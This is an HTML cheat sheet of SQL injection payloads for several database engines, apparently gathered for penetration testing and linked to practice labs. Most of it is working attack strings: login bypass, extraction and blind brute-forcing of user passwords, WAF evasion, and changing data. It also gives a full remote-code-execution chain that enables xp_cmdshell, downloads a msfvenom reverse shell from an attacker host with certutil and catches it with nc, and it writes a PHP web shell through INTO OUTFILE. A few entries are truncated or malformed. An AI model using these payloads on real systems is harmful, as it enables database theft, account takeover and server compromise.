<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Cheat Sheet</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Press+Start+2P&display=swap');

    :root {
        --color-dark: #050A0E;
        --color-medium: #0D1B2A;
        --color-light: #1B263B;
        --color-neon-red: #FF073A;
        --color-text-light: #c0c7d6;
        --color-glitch1: #FF3131;
        --color-glitch2: #FF073A;
    }

    * {
        font-family: 'Fira Code', sans-serif;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background-color: var(--color-dark);
        color: var(--color-text-light);
        min-height: 100vh;
        padding: 20px;
        position: relative;
        overflow-x: hidden;
    }

    body::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(rgba(255, 7, 58, 0.1), rgba(255, 7, 58, 0.05)), url('https://www.transparenttextures.com/patterns/3px-tile.png');
        z-index: -1;
        animation: moveBackground 5s linear infinite;
    }

    @keyframes moveBackground {
        from { background-position: 0 0; }
        to { background-position: 100px 100px; }
    }

    .container {
        background: rgba(15, 25, 35, 0.85);
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 20px var(--color-neon-red);
        width: 100%;
        max-width: 1200px;
        margin: 20px auto;
        border: 2px solid var(--color-neon-red);
        position: relative;
    }

    .sql-injection-cheat-sheet {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
    }

    h1 {
        font-family: 'Press Start 2P', cursive;
        font-size: 24px;
        color: var(--color-neon-red);
        margin-bottom: 25px;
        animation: glitch 0.5s infinite alternate;
        text-align: center;
    }

    h2, h3 {
        color: var(--color-neon-red);
        margin: 20px 0;
        border-bottom: 2px solid var(--color-neon-red);
        padding-bottom: 10px;
        text-align: left;
    }

    p {
        margin: 15px 0;
        line-height: 1.6;
        text-align: justify;
    }

    pre, code {
        background: var(--color-medium);
        padding: 15px;
        border-radius: 5px;
        font-size: 14px;
        color: var(--color-neon-red);
        border: 2px solid var(--color-neon-red);
        overflow-x: auto;
        margin: 15px 0;
        line-height: 1.5;
        display: block;
        white-space: pre-wrap;
        word-wrap: break-word;
    }

    table {
        width: 100%;
        border-collapse: collapse;
        margin: 20px 0;
        background: var(--color-medium);
        border: 2px solid var(--color-neon-red);
    }

    th, td {
        padding: 12px;
        border: 1px solid var(--color-neon-red);
        text-align: left;
        vertical-align: top;
    }

    th {
        background-color: rgba(255, 7, 58, 0.1);
        font-weight: bold;
    }

    ul, ol {
        margin: 15px 0;
        padding-left: 30px;
    }

    li {
        margin: 10px 0;
        line-height: 1.6;
    }

    em {
        font-style: italic;
        color: var(--color-text-light);
    }

    strong {
        font-weight: bold;
        color: var(--color-neon-red);
    }

    a {
        color: var(--color-neon-red);
        text-decoration: none;
    }

    a:hover {
        text-decoration: underline;
    }

    .scanlines {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: repeating-linear-gradient(
            to bottom,
            rgba(255, 255, 255, 0.02),
            rgba(255, 255, 255, 0.02) 1px,
            transparent 1px,
            transparent 2px
        );
        pointer-events: none;
        animation: scanlines 0.3s linear infinite;
    }

    @keyframes scanlines {
        from { transform: translateY(0); }
        to { transform: translateY(2px); }
    }
    </style>
</head>
<body>
    <div class="sql-injection-cheat-sheet">
        <br>
        <br>
        <h1>SQL Injection</h1>
        
      
        <p>SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. This page is about the SQL injection cheat sheet.</p>
      
        <h2>Entry Point Detection</h2>
        <p>Reference: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a></p>
        <pre><code>'
%27
%2527

"
%22
%2522

`
%60
%2560

#
%23
%2523

;
%3B
%253B

)
%29
%2529

')
%27%29
%2527%2529

")
%22%29
%2522%2529</code></pre>
      
        <h2>Comment Syntax</h2>
        <p>Comment syntax depends on the database used:</p>
        <table>
            <thead>
                <tr><th>DBMS</th><th>Comments</th></tr>
            </thead>
            <tbody>
                <tr><td>MySQL</td><td><code>-- -</code><code>--</code><br><code>#</code><br><code>/*comment*/</code><br><code>/*!comment*/</code></td></tr>
                <tr><td>MSSQL</td><td><code>--</code><br><code>/*comment*/</code></td></tr>
                <tr><td>Oracle</td><td><code>--</code></td></tr>
                <tr><td>PostgreSQL</td><td><code>--</code><br><code>/*comment*/</code></td></tr>
                <tr><td>SQLite</td><td><code>--</code><br><code>/*comment*/</code></td></tr>
            </tbody>
        </table>
      
        <h2>Basic Injection</h2>
        <p>Check if we can inject SQL commands into forms or URL params in the target website.</p>
        <pre><code>' OR 1=1--
' OR 1=1-- -
' OR 1=1#

' OR '1'='1'--
' OR '1'='1'-- -
' OR '1'='1'#

" OR 1=1--
" OR 1=1-- -
" OR 1=1#

') OR 1=1--
') OR 1=1-- -
') OR 1=1#

'; OR 1=1--
'; OR 1=1-- -
'; OR 1=1#

admin or 1=1--
admin or 1=1-- -
admin or 1=1#</code></pre>
      
        <h2>Blind Injection â€“ Timing</h2>
        <p>Reference: <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/blind-sqli">HackTricks</a></p>
        <pre><code><!-- MySQL -->
test' AND sleep(10)
test ' OR sleep(10)

<!-- MSSQL -->
test' WAITFOR DELAY '0:0:10'

<!-- Oracle -->
test' AND DBMS_SESSION.SLEEP(10)

<!-- PostgreSQL -->
test' AND pg_sleep(10)
test' OR pg_sleep(10)
test' || pg_sleep(10)

<!-- SQLite -->
test' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</code></pre>
      
        <h2>Brute Force Values</h2>
        <pre><code>' password LIKE '%'-- -
' password LIKE BINARY '%'-- -

' password REGEXP '^[a-z]*'-- -
' password REGEXP BINARY '^[a-z]*'-- -</code></pre>
      
        <h2>WAF Bypass</h2>
        <p>Reference: <a href="https://owasp.org/www-project-top-ten/">OWASP</a></p>
      
        <h3>HTTP Parameter Pollution</h3>
        <pre><code>/?id='+select+1&id=2,3+from+users+where+id=1-- -</code></pre>
      
        <h3>New Line (<code>%0A</code>)</h3>
        <pre><code>/?id=%0A' OR 1=1-- -</code></pre>
      
        <h2>Version Detection</h2>
      
        <h3>MSSQL</h3>
        <pre><code>' UNION SELECT @@version--
' UNION SELECT NULL,@@version--</code></pre>
      
        <h3>MySQL</h3>
        <pre><code>' UNION SELECT @@version-- -
' UNION SELECT @@version#
' UNION SELECT NULL,@@version-- -
' UNION SELECT NULL,@@version#</code></pre>
      
        <h3>Oracle</h3>
        <pre><code>' UNION SELECT 'a' FROM dual--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT * FROM v$version--
' UNION SELECT BANNER,NULL FROM v$version--</code></pre>
      
        <h3>PostgreSQL</h3>
        <pre><code>' UNION SELECT version()--
' UNION SELECT NULL,version()--</code></pre>
      
        <h3>SQLite</h3>
        <pre><code>' UNION SELECT sqlite_version()--
' UNION SELECT sqlite_version(),NULL--</code></pre>
      
        <h2>Detect Number of Columns</h2>
        <pre><code>' UNION SELECT NULL--
' UNION SELECT NULL-- -

' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL-- -

' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- -

' UNION SELECT 'a',NULL,NULL--
' UNION SELECT 'a',NULL,NULL-- -

' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,'a',NULL-- -

' UNION SELECT NULL,NULL,'a'--
' UNION SELECT NULL,NULL,'a'-- -

-- and so on to find the correct count.</code></pre>
      
        <h2>List Table Names</h2>
        <h3>MSSQL</h3>
        <pre><code>' UNION SELECT table_name,NULL FROM information_schema.tables--</code></pre>
      
        <h3>MySQL</h3>
        <pre><code>' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT table_name,NULL FROM information_schema.tables#
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables-- -
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables#</code></pre>
      
        <h3>PostgreSQL</h3>
        <pre><code>' UNION SELECT table_name,NULL FROM information_schema.tables--</code></pre>
      
        <h3>Oracle</h3>
        <pre><code>' UNION SELECT table_name,NULL FROM all_tables--</code></pre>
      
        <h3>SQLite</h3>
        <pre><code>' UNION SELECT tbl_name FROM sqlite_master--
' UNION SELECT tbl_name,NULL FROM sqlite_master--</code></pre>
      
        <h2>List Column Names</h2>
        <h3>MSSQL</h3>
        <pre><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--</code></pre>
      
        <h3>MySQL</h3>
        <pre><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'#</code></pre>
      
        <h3>PostgreSQL</h3>
        <pre><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--</code></pre>
      
        <h3>Oracle</h3>
        <pre><code>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'--</code></pre>
      
        <h3>SQLite</h3>
        <pre><code>' UNION SELECT column</code></pre>
      
        <h2>List Information in the Table</h2>
        <p>Get information in the table. For example, to get username and password from the <code>users</code> table:</p>
        <pre><code>' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users-- -

' UNION SELECT username || '~' || password FROM users--
' UNION SELECT username || '~' || password FROM users-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'-- -</code></pre>
        <p><strong>BINARY:</strong> Sensitive to upper case and lower case.</p>
        <pre><code>' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'-- -</code></pre>
      
        <h3>Dumping Table</h3>
        <pre><code>' UNION SELECT table_name FROM table_name--
' UNION SELECT table_name,NULL FROM table_name--</code></pre>
      
        <h2>Fetch All Entities</h2>
        <pre><code>' UNION SELECT * FROM users-- -
'; SELECT * FROM users-- -</code></pre>
      
        <h2>Modify/Insert Data</h2>
        <h3>Insert Arbitrary Data</h3>
        <pre><code>' INSERT INTO users (username, password) VALUES ('admin', 'pass')-- -
'; INSERT INTO users (username, password) VALUES ('admin', 'pass')-- -

<!-- Insert a payload -->
' INSERT INTO products (id, name, price) VALUES (999, "<?php system('id'); ?>", 10)-- -</code></pre>
      
        <h3>Update Arbitrary Data</h3>
        <pre><code>' UPDATE users SET password='password123' WHERE username='admin'-- -
' UPDATE users SET password='password123' WHERE id=1-- -</code></pre>
      
        <h3>Upsert</h3>
        <p>Combination of <code>UPDATE</code> and <code>INSERT</code>. If a row exists it's updated, otherwise inserted.</p>
        <pre><code><!-- MySQL -->
INSERT INTO users (username, password) VALUES('admin', '') ON DUPLICATE KEY UPDATE password=''-- -

<!-- PostgreSQL, SQLite -->
INSERT INTO users (username, password) VALUES ('admin', '') ON CONFLICT (username) DO UPDATE SET password='password'--</code></pre>
      
        <h2>Command Injection</h2>
        <h3>MySQL</h3>
        <pre><code>' UNION SELECT NULL,sys_eval('whoami') FROM users-- -</code></pre>
      
        <h3>MSSQL</h3>
        <pre><code><!-- 1. Enable OS commands -->
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -

<!-- 2. Execute command -->
'; exec master..xp_cmdshell 'powershell -e <BASE64_COMMAND>';-- -</code></pre>
      
        <h2>RCE</h2>
      
        <h3>MSSQL</h3>
        <ol>
            <li>
                In the attack machine, prepare a payload for a reverse shell. Replace the IP address of <code>LHOST</code> with your own IP.
                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe</code></pre>
            </li>
            <li>
                In the attack machine, start a local web server to host the payload file.
                <pre><code>python3 -m http.server 8000</code></pre>
            </li>
            <li>
                In the attack machine, start a listener to receive the incoming connection.
                <pre><code>nc -lvnp 4444</code></pre>
            </li>
            <li>
                In the target website, execute the shell commands via SQLi:
                <p><!-- 1. Enable the shell command --></p>
                <pre><code>' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--</code></pre>
                <p><!-- 2. Download our payload --></p>
                <pre><code>' ; EXEC xp_cmdshell 'certutil -urlcache -f http://10.0.0.1:8000/shell.exe C:\Windows\Temp\shell.exe';--</code></pre>
                <p><!-- 3. Execute the payload --></p>
                <pre><code>' ; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--</code></pre>
            </li>
        </ol>
        <p>After execution, you should receive a shell on the target system.</p>

        <h2>Error-based SQLi</h2>
        <p>Reference: <a href="https://portswigger.net/web-security/sql-injection/error-based">PortSwigger</a></p>
        <p>We might be able to gather information of the database by triggering error messages.</p>
        <h3>MySQL</h3>
        <pre><code>' AND 1=CAST((SELECT 1) AS int)-- -
' AND 1=CAST((SELECT password FROM users) AS int)-- -
<!-- Limit to one row -->
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)</code></pre>

        <h2>Blind SQL</h2>
        <h3>1. Check if Injection Works</h3>
        <pre><code>' AND '1'='1
' AND '1'='2
' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>

        <h3>2. Check Existence of a Value</h3>
        <p>e.g., check if username 'administrator' exists:</p>
        <pre><code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></pre>

        <h3>3. Determine Password Length</h3>
        <pre><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a</code></pre>

        <h3>4. Brute Force Password Characters</h3>
        <pre><code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$</code></pre>

        <h2>Blind SQL (Time-based)</h2>
        <h3>1. Initial Sleep Test</h3>
        <ul>
            <li><strong>MySQL:</strong>
                <pre><code>' AND sleep(5)-- -</code></pre>
            </li>
            <li><strong>PostgreSQL:</strong>
                <pre><code>'||pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--</code></pre>
            </li>
        </ul>

        <h3>2. Conditional Sleep for Value Existence</h3>
        <pre><code>'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code></pre>

        <h3>3. Determine Password Length via Sleep</h3>
        <pre><code>'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code></pre>

        <h3>4. Brute Force via Sleep</h3>
        <pre><code>'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code></pre>

        <h2>Conditional Error</h2>
        <p>Trigger errors conditionally to exfiltrate data:</p>
        <pre><code>'
''
'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></pre>

        <h2>Writing Files</h2>
        <p>You can write arbitrary code to a file on the server:</p>
        <pre><code>' SELECT '<?php echo system("id");?>' INTO OUTFILE '/var/www/html/shell.php'-- -</code></pre>

        <h3>HEX Encoded Payloads</h3>
        <pre><code>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E-- -
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#</code></pre>
        <p><code>0x3C3F...</code> is hex for <code>&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;</code>. After injection, access: <code>http://10.0.0.1/shell.php?cmd=whoami</code>.</p>

        <h2>XML Filter Bypass</h2>
        <p>Reference: <a href="https://portswigger.net/web-security/xml/exploiting">PortSwigger</a></p>
        <pre><code><storeId>&amp;#x53;LECT * FROM information_schema.tables</storeId></code></pre>
        <p>If using Burp Suite, consider the Hackvertor extension to obfuscate payloads (Extensions â†’ Hackvertor â†’ Encode â†’ hex_entities).</p>

        <h2>XPATH Injection</h2>
        <h3>MySQL</h3>
        <pre><code>' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,1,16) FROM users)),NULL)-- -</code></pre>
        <p>If you see an error like <em>XPATH syntax error: ':3ac6b24dc611a692'</em>, you've retrieved part of the hash.</p>
        <pre><code>' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,17,32) FROM users)),NULL)-- -</code></pre>

        <h2>Truncation Attack</h2>
        <p>Exploit truncation by padding usernames past column length.</p>
        <p>First, inspect schema:</p>
        <pre><code>CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
);</code></pre>
        <p>Then register "admin" with extra spaces (use "+" for spaces):</p>
        <pre><code># POST /create-user
username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password</code></pre>
        <p>Try logging in as "admin" with original password:</p>
        <pre><code>username=admin&password=password</code></pre>
        <p>Fetch admin's record:</p>
        <pre><code>SELECT * FROM users WHERE username='admin';</code></pre>
        <h2>Labs</h2>
        <p>SQL injection - Authentication: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication">Root-me</a></p>
        <p>SQL injection - String: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String">Root-me</a></p>
        <p>querying the database type and version on MySQL: <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Port-Swigger</a></p>
        <p>SQL injection attack, listing the database contents on Oracle: <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Port-Swigger</a></p>
        <p>SQL injection UNION attack, determining the number of columns returned by the query: <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">Port-Swigger</a></p>


</body>
</html>